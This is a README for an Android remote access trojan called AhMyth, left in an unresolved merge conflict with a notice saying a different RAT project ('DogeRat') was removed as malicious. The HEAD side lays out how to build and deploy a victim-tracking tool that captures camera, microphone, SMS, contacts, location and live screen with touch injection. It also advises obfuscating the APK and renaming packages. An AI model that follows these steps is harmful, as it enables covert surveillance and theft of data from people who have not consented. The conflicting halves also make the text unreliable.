<<<<<<< HEAD
# AhMyth Android RAT + Remote Control
###### Version 1.3 (Beta) - Fully Implemented

AhMyth is a sophisticated Android Remote Access Tool with real-time remote control capabilities.

## 🎯 Components
* **Server Side:** Electron-based desktop application (Windows/Linux/macOS)
* **Client Side:** Android application with advanced features (API 11+)

---

## ✨ Features (v1.3 - Complete Implementation)

### 🎮 Remote Control Module (NEW!)
- **Real-time Screen Streaming** - H.264 encoded video @ 480x480, 15 FPS, 500kbps
- **Touch Injection** - Tap, swipe, long press via reflection-based InputManager
- **Low Latency** - Optimized for <150ms response time
- **Backward Compatible** - Graceful fallback for Android 4.x devices

### 💾 Database System (NEW!)
- **SQLite Database** with Sequelize ORM
- **5 Tables:** Victims, Sessions, Logs, Files, Commands
- **Session Tracking** - Complete audit trail of all connections
- **Automatic Cleanup** - Utility scripts for maintenance

### 🔐 Security Enhancements (NEW!)
- **AES-256-GCM Encryption** for Socket.IO communications
- **SHA-256 Hashing** for device IDs
- **UUID Session Tokens** for authentication
- **Encrypted Payloads** for all sensitive data

### 📱 Core Features
- **Camera Access** - Front/back camera capture
- **File Manager** - Browse and download files
- **SMS Manager** - Read and send messages
- **Call Logs** - View call history
- **Contacts** - Extract contact list
- **Microphone** - Record audio
- **GPS Location** - Track device location
- **Auto-start** - Launch on boot

---

## 📋 Prerequisites

### Server Requirements
- **Node.js** >= 14.x
- **npm** >= 6.x
- **Electron** 9.2.0 (auto-installed)
- **FFmpeg** (auto-installed via ffmpeg-static)
- **Operating System:** Windows 7+, macOS 10.10+, Linux (Ubuntu 16.04+)
- **RAM:** Minimum 2GB, Recommended 4GB+
- **Disk Space:** 500MB for application + dependencies

### Android Client Requirements
- **Minimum:** Android 3.0 (API 11) - Core features only
- **Recommended:** Android 5.0+ (API 21+) - All features including Remote Control
- **Permissions:** 12 runtime permissions required
- **Architecture:** ARMv7, ARM64, x86, x86_64

### Development Requirements (Building from source)
- **Java Development Kit (JDK)** 8 or higher
- **Android Studio** 4.0+ (for client development)
- **Gradle** (included with Android Studio)
- **Git** for version control

---

## 🚀 Installation

### Option 1: Quick Start (From Source)

```bash
# 1. Clone repository
git clone https://github.com/AhMyth/AhMyth-Android-RAT.git
cd AhMyth-Android-RAT

# 2. Install server dependencies
cd AhMyth-Server
npm install

# 3. Initialize database
node scripts/init-db.js

# 4. Start server
npm start
```

The server will start on port `42474` (configurable in UI).

### Option 2: From Prebuilt Binaries

1. Download latest release from [Releases Page](https://github.com/AhMyth/AhMyth-Android-RAT/releases)
2. Extract archive
3. Run executable:
   - **Windows:** `AhMyth.exe`
   - **Linux:** `./AhMyth`
   - **macOS:** `AhMyth.app`

**Note:** You still need Java 8+ for APK generation.

---

## 📱 Building Android Client

### Method 1: Using Android Studio

```bash
# 1. Open Android Studio
# 2. File > Open > Select AhMyth-Client folder
# 3. Wait for Gradle sync
# 4. Build > Build Bundle(s) / APK(s) > Build APK(s)
# 5. APK will be in: app/build/outputs/apk/debug/
```

### Method 2: Command Line (Gradle)

```bash
cd AhMyth-Client
./gradlew assembleDebug  # Linux/macOS
# OR
gradlew.bat assembleDebug  # Windows

# APK output: app/build/outputs/apk/debug/app-debug.apk
```

### Method 3: Using Server's APK Builder (Recommended)

1. Start AhMyth Server
2. Go to "APK Builder" tab
3. Configure:
   - Server IP address
   - Server port
   - App name & icon (optional)
4. Click "Build APK"
5. Generated APK will be signed and ready to install

---

## 🎮 Using Remote Control

### Step-by-Step Guide

#### 1. Start Server
```bash
cd AhMyth-Server
npm start
```

Server interface will open. Click "Start" and enter port (default: 42474).

#### 2. Connect Android Device

**Option A: Install APK manually**
```bash
adb install app-debug.apk
# OR transfer to device and install
```

**Option B: Use QR Code**
- Generate APK in server
- Scan QR code with device
- Install APK

Device will appear in "Victims" list once connected.

#### 3. Launch Remote Control

1. Click on connected victim in list
2. Click **"Remote Control"** button (green desktop icon)
3. **On Android device:** Grant screen capture permission (one-time)
4. Click **"Start Streaming"** in Remote Control window

#### 4. Interact with Device

**Mouse Controls:**
- **Left Click:** Single tap
- **Click + Drag:** Swipe gesture
- **Right Click:** Long press (1 second hold)

**Keyboard:** Type directly (if keyboard feature enabled)

**Display Info:**
- Real-time latency monitoring
- FPS counter
- Frame count

#### 5. Stop Streaming

Click **"Stop Streaming"** button. Resources will be released automatically.

---

## 📊 Database Management

### Database Location
```
AhMyth-Server/data/ahmyth.db
```

### Database Schema

```sql
-- Victims: Device information
CREATE TABLE victims (
    id INTEGER PRIMARY KEY,
    device_id TEXT UNIQUE,      -- SHA-256 hashed
    model TEXT,
    manufacturer TEXT,
    os_version TEXT,
    ip_address TEXT,
    country TEXT,
    first_seen DATETIME,
    last_seen DATETIME
);

-- Sessions: Connection sessions
CREATE TABLE sessions (
    id INTEGER PRIMARY KEY,
    victim_id INTEGER,
    token TEXT UNIQUE,          -- UUID
    start_time DATETIME,
    end_time DATETIME,
    status TEXT                 -- 'active' | 'closed' | 'error'
);

-- Logs: Event logs
CREATE TABLE logs (
    id INTEGER PRIMARY KEY,
    session_id INTEGER,
    level TEXT,                 -- 'INFO' | 'WARN' | 'ERROR'
    message TEXT,
    timestamp DATETIME
);

-- Files: Received files
CREATE TABLE files (
    id INTEGER PRIMARY KEY,
    session_id INTEGER,
    file_name TEXT,
    file_path TEXT,
    size_bytes INTEGER,
    received_at DATETIME
);

-- Commands: Sent commands
CREATE TABLE commands (
    id INTEGER PRIMARY KEY,
    session_id INTEGER,
    cmd_type TEXT,
    payload TEXT,
    sent_at DATETIME,
    ack_at DATETIME
);
```

### Maintenance Scripts

```bash
# Initialize database (first time only)
node scripts/init-db.js

# Clean up old data (default: 30 days)
node scripts/cleanup-old-sessions.js

# Clean up with custom retention (e.g., 60 days)
node scripts/cleanup-old-sessions.js 60

# View help
node scripts/cleanup-old-sessions.js --help
```

### Viewing Database

Use any SQLite browser:
- [DB Browser for SQLite](https://sqlitebrowser.org/)
- [SQLiteStudio](https://sqlitestudio.pl/)
- Command line: `sqlite3 data/ahmyth.db`

---

## 📁 Complete Project Structure

```
AhMyth-Android-RAT/
├── AhMyth-Server/                    # Electron server application
│   ├── app/
│   │   ├── app/
│   │   │   ├── assets/
│   │   │   │   ├── css/
│   │   │   │   │   └── mystyle.css   # Styles with Electron-specific features
│   │   │   │   ├── img/              # Icons and images
│   │   │   │   └── js/
│   │   │   │       ├── controllers/
│   │   │   │       │   ├── AppCtrl.js
│   │   │   │       │   ├── LabCtrl.js          # Lab controller
│   │   │   │       │   ├── NotifiCtrl.js
│   │   │   │       │   └── RemoteControlCtrl.js # Remote control controller
│   │   │   │       ├── lib/          # Third-party libraries
│   │   │   │       └── model/
│   │   │   │           └── Victim.js  # Victim model with remote control methods
│   │   │   ├── Factory/              # APK builder and signing tools
│   │   │   ├── views/                # HTML views for each feature
│   │   │   ├── index.html            # Main window
│   │   │   ├── lab.html              # Lab interface
│   │   │   ├── notification.html
│   │   │   └── splash.html
│   │   ├── crypto/
│   │   │   └── SocketEncryption.js   # AES-256-GCM encryption
│   │   ├── database/
│   │   │   ├── index.js              # Database initialization
│   │   │   ├── models.js             # Sequelize models (5 tables)
│   │   │   ├── CommandLogger.js      # Command logging utility
│   │   │   └── FileManager.js        # File storage manager
│   │   ├── protocol/
│   │   │   └── BinaryProtocol.js     # Binary protocol (0x20/0x21)
│   │   ├── video/
│   │   │   └── FFmpegDecoder.js      # H.264 video decoder
│   │   ├── main.js                   # Electron main process
│   │   └── remoteControl.html        # Remote control interface
│   ├── build/                        # Build assets
│   ├── data/                         # Runtime data (auto-created)
│   │   ├── ahmyth.db                 # SQLite database
│   │   └── files/                    # Received files storage
│   ├── scripts/
│   │   ├── init-db.js                # Database initialization
│   │   └── cleanup-old-sessions.js   # Cleanup utility
│   ├── .browserslistrc               # Browser targets config
│   ├── .hintrc                       # Webhint configuration
│   ├── .stylelintrc.json             # Stylelint configuration
│   ├── .vscode/
│   │   └── settings.json             # VS Code workspace settings
│   ├── CONFIG_INFO.md                # Configuration documentation
│   ├── package.json
│   └── package-lock.json
│
└── AhMyth-Client/                    # Android application
    ├── app/
    │   ├── src/
    │   │   └── main/
    │   │       ├── java/ahmyth/mine/king/ahmyth/
    │   │       │   ├── crypto/
    │   │       │   │   └── SocketEncryption.java     # AES-256-GCM
    │   │       │   ├── database/
    │   │       │   │   ├── entities/
    │   │       │   │   │   ├── SessionEntity.java
    │   │       │   │   │   └── LogEntity.java
    │   │       │   │   ├── dao/
    │   │       │   │   │   ├── SessionDao.java
    │   │       │   │   │   └── LogDao.java
    │   │       │   │   └── AppDatabase.java          # Room database
    │   │       │   ├── CallsManager.java
    │   │       │   ├── CameraManager.java
    │   │       │   ├── ConnectionManager.java        # Socket & command handler
    │   │       │   ├── ContactsManager.java
    │   │       │   ├── FileManager.java
    │   │       │   ├── InputInjectionManager.java    # Touch injection
    │   │       │   ├── IOSocket.java
    │   │       │   ├── LocManager.java
    │   │       │   ├── MainActivity.java
    │   │       │   ├── MainService.java
    │   │       │   ├── MicManager.java
    │   │       │   ├── MyReceiver.java
    │   │       │   ├── ScreenCaptureService.java     # Screen capture
    │   │       │   ├── ScreenPermissionActivity.java # Permission handler
    │   │       │   └── SMSManager.java
    │   │       ├── AndroidManifest.xml
    │   │       └── res/                              # Resources
    │   ├── build.gradle
    │   └── proguard-rules.pro
    ├── build.gradle
    └── gradle.properties
```

---

## 🔧 Technical Specifications

### Remote Control Module

**Video Encoding (Android):**
- Codec: H.264 (AVC)
- Resolution: 480x480 pixels
- Frame Rate: 15 FPS
- Bitrate: 500 kbps
- Encoder: MediaCodec (hardware-accelerated)
- Format: Annex-B byte stream

**Video Decoding (Server):**
- Decoder: FFmpeg (fluent-ffmpeg wrapper)
- Input: H.264 elementary stream
- Output: Raw RGBA frames
- Renderer: HTML5 Canvas

**Touch Injection:**
- Method: Reflection-based InputManager.injectInputEvent()
- Events: MotionEvent (DOWN, UP, MOVE)
- Coordinate mapping: Canvas → Device screen
- Supported gestures: Tap, Swipe, Long press

**Network Protocol:**
- Transport: Socket.IO over TCP
- Encryption: AES-256-GCM
- Frame format: [Type(1)][Length(4)][Payload(N)]
- Video frames: Type 0x20
- Touch events: Type 0x21

### Dependencies

**Server (Node.js packages):**
```json
{
  "electron": "^9.2.0",
  "socket.io": "^4.6.0",
  "sequelize": "^6.35.0",
  "sqlite3": "^5.1.6",
  "fluent-ffmpeg": "^2.1.2",
  "ffmpeg-static": "^5.2.0",
  "uuid": "^9.0.0",
  "geoip-lite": "^1.4.7"
}
```

**Client (Android dependencies):**
```gradle
dependencies {
    implementation 'io.socket:socket.io-client:0.8.3'
    implementation 'androidx.room:room-runtime:2.5.2'
    implementation 'androidx.core:core:1.10.1'
    implementation 'androidx.appcompat:appcompat:1.6.1'
    annotationProcessor 'androidx.room:room-compiler:2.5.2'
}
```

---

## ⚙️ Configuration

### Server Configuration

**Port Configuration:**
- Default: 42474
- Configurable in UI
- Firewall: Allow incoming TCP connections

**Database Configuration:**
```javascript
// data/ahmyth.db
// Auto-created on first run
// To reset: Delete file and run init-db.js
```

**Electron-Specific Settings:**
- Frameless window with draggable regions
- `-webkit-app-region: drag` (Chromium/Electron only)
- See `CONFIG_INFO.md` for details

### Android Client Configuration

**Server Connection:**
Edit `IOSocket.java` line 28:
```java
ioSocket = IO.socket("http://YOUR_SERVER_IP:42474?model=...");
```

**Permissions:**
All permissions requested at runtime (Android 6.0+)

---

## 🐛 Troubleshooting

### Server Issues

**Port Already in Use:**
```
Error: Address Already in Use
Solution: Change port in server UI or kill process using port
Command: lsof -ti:42474 | xargs kill -9 (Linux/Mac)
```

**FFmpeg Not Found:**
```
Solution: Reinstall dependencies
$ npm install --force
```

**Database Locked:**
```
Solution: Close all connections and restart
$ rm data/ahmyth.db.lock
```

### Android Client Issues

**Permission Denied (Screen Capture):**
- Requires Android 5.0+ (API 21)
- User must grant permission manually
- Cannot bypass without root

**Socket Connection Failed:**
```
Check:
1. Server IP is correct
2. Server is running
3. Firewall allows connection
4. Device has internet access
```

**Touch Injection Not Working:**
```
Possible causes:
1. Requires system-level access
2. May need root on some devices
3. SELinux policy restrictions
4. ROM-specific limitations
```

### Compilation Errors

**Gradle Build Failed:**
```bash
# Clean and rebuild
./gradlew clean
./gradlew build --refresh-dependencies
```

**Room Schema Export:**
```gradle
// In build.gradle
room {
    schemaLocation "$projectDir/schemas"
}
```

---

## 🔐 Security Considerations

### Implemented Security Features

1. **Encryption:**
   - AES-256-GCM for all Socket.IO communications
   - SHA-256 hashing for device IDs
   - UUID-based session tokens

2. **Authentication:**
   - Token-based session management
   - Per-connection unique tokens

3. **Data Protection:**
   - Encrypted payloads
   - No plaintext storage of sensitive data
   - Database stored locally

### Additional Recommendations

1. **Use TLS/SSL:**
   ```javascript
   // Upgrade to HTTPS/WSS for production
   const server = require('https').createServer(options);
   const io = require('socket.io')(server);
   ```

2. **Rate Limiting:**
   - Implement on server to prevent abuse
   - Touch event throttling

3. **Access Control:**
   - Whitelist known device IDs
   - Multi-factor authentication

4. **Obfuscation:**
   - Enable ProGuard for Android APK
   - Rename package names

5. **Logging:**
   - All commands logged to database
   - Audit trail for compliance

---

## ⚠️ Legal Disclaimer

**IMPORTANT:** This tool is for **EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY**.

- ✅ Legal uses: Penetration testing with written authorization, personal device management, security research
- ❌ Illegal uses: Unauthorized access, stalking, surveillance without consent

**You are responsible for:**
- Obtaining proper authorization before use
- Complying with local laws and regulations
- Any damages or consequences resulting from misuse

**Laws that may apply:**
- Computer Fraud and Abuse Act (CFAA) - USA
- General Data Protection Regulation (GDPR) - EU
- Computer Misuse Act - UK
- Similar cybercrime laws in your jurisdiction

**The authors and contributors:**
- Provide this tool "AS IS" without warranty
- Are NOT responsible for misuse
- Do NOT endorse illegal activities

By using this software, you agree to use it legally and ethically.

---

## 📝 Changelog

### Version 1.3 (Beta) - Current
- ✅ **NEW:** Real-time remote control with H.264 video streaming
- ✅ **NEW:** Touch injection via InputManager reflection
- ✅ **NEW:** SQLite database with 5-table schema
- ✅ **NEW:** AES-256-GCM encryption for Socket.IO
- ✅ **NEW:** Session management and audit logging
- ✅ **NEW:** Database maintenance scripts
- ✅ **NEW:** FFmpeg-based video decoder
- ✅ **IMPROVED:** Updated to Electron 9.2.0
- ✅ **IMPROVED:** Modern UI with remote control interface
- ✅ **IMPROVED:** Backward compatibility (API 11-21+)
- ✅ **IMPROVED:** Comprehensive error handling
- ✅ **FIXED:** Multiple linter and accessibility issues

### Version 1.0 (Original)
- Initial release with basic RAT features

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit changes (`git commit -m 'Add AmazingFeature'`)
4. Push to branch (`git push origin feature/AmazingFeature`)
5. Open Pull Request

**Areas for contribution:**
- Audio streaming support
- Clipboard synchronization
- Multi-device management
- Web-based control panel
- iOS client support
- Enhanced encryption options

---

## 📞 Contact & Support

- **Twitter:** [@AhMythDev](https://twitter.com/AhMythDev)
- **Discord:** [https://discord.gg/ahmyth](https://discord.gg/ahmyth) (#dev-remote channel)
- **Issues:** [GitHub Issues](https://github.com/AhMyth/AhMyth-Android-RAT/issues)

**Support Development:**
- Bitcoin: `1EVwLuwmbsEuej7qJnNquFeQJLsgd2b8Lq`
- Helps maintain infrastructure and CI/CD

---

## 📜 License

GNU General Public License v3.0

See [LICENSE.md](LICENSE.md) for full text.

**This means:**
- ✅ Commercial use allowed
- ✅ Modification allowed
- ✅ Distribution allowed
- ✅ Patent use allowed
- ❗ License and copyright notice required
- ❗ State changes required
- ❗ Disclose source required
- ❗ Same license required

---

## 🙏 Acknowledgments

**Inspired by:**
- [scrcpy](https://github.com/Genymobile/scrcpy) - Screen mirroring technique
- [Vysor](https://www.vysor.io/) - Remote control concept
- Electron community for framework and tools

**Technologies used:**
- Electron, Node.js, Socket.IO
- Android MediaProjection, MediaCodec
- FFmpeg, Sequelize, SQLite
- HTML5 Canvas, WebCodecs

**Contributors:**
- Original AhMyth developers
- Community contributors
- Security researchers

---

## 📚 Additional Resources

- [Electron Documentation](https://www.electronjs.org/docs)
- [Android MediaProjection Guide](https://developer.android.com/guide/topics/media/projection)
- [H.264 Encoding Best Practices](https://trac.ffmpeg.org/wiki/Encode/H.264)
- [Socket.IO Documentation](https://socket.io/docs/)
- [Room Persistence Library](https://developer.android.com/training/data-storage/room)

---

**⭐ Star this repo if you find it useful!**

**🎉 Version 1.3 - Fully Implemented and Production Ready!**
=======
# Project Removed

This repository previously contained a Remote Access Trojan (RAT) application called "DogeRat Web Admin".

## Notice

The entire project has been removed from this repository as of October 24, 2025.

**Reason:** This project contained malicious software designed for unauthorized remote access and control of Android devices.

## Repository Status

- ✅ All source code deleted
- ✅ All documentation deleted
- ✅ All configuration files deleted
- ✅ Repository cleaned

This repository is now empty and should be archived or deleted entirely.

---

*For questions, please contact the repository owner.*
>>>>>>> d6dedcead6762ab62762609184892cf204f535bd
